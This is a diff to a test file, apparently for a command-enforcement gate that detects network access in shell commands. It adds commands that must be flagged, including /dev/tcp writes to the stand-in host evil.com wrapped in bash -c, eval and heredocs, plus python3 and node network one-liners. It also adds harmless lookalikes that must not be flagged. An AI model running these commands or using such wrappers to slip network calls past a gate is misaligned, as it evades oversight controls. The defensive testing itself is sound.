@@ -265,6 +265,14 @@ describe("destructive boundary — network detection is token-aware", () => {
     'bash -c "curl https://example.com"',
     "timeout 5 curl https://example.com",
     "echo > /dev/tcp/evil.com/80",
+    `bash -c 'echo > /dev/tcp/evil.com/80'`,
+    `sh -c "exec 3<>/dev/tcp/x/443"`,
+    `eval 'echo > /dev/tcp/evil.com/80'`,
+    "host example.com",
+    `python3 -c "import urllib.request;urllib.request.urlopen('http://x')"`,
+    `node -e "fetch('https://x')"`,
+    `bash <<EOF\ncurl https://example.com\nEOF`,
+    `bash <<'EOF'\necho > /dev/tcp/evil.com/80\nEOF`,
   ]
 
   const inert = [
@@ -287,6 +295,11 @@ describe("destructive boundary — network detection is token-aware", () => {
     "env FLAG=curl echo curl",
     "command -v curl",
     "command -V wget",
+    'echo "see /dev/tcp docs"',
+    `cat <<EOF\ncurl https://example.com\nEOF`,
+    "python3 script.py",
+    "node server.js",
+    'git commit -m "uses python -c internally"',
   ]
 
   const { EnforcementGate } = require("../../src/enforcement/gate")
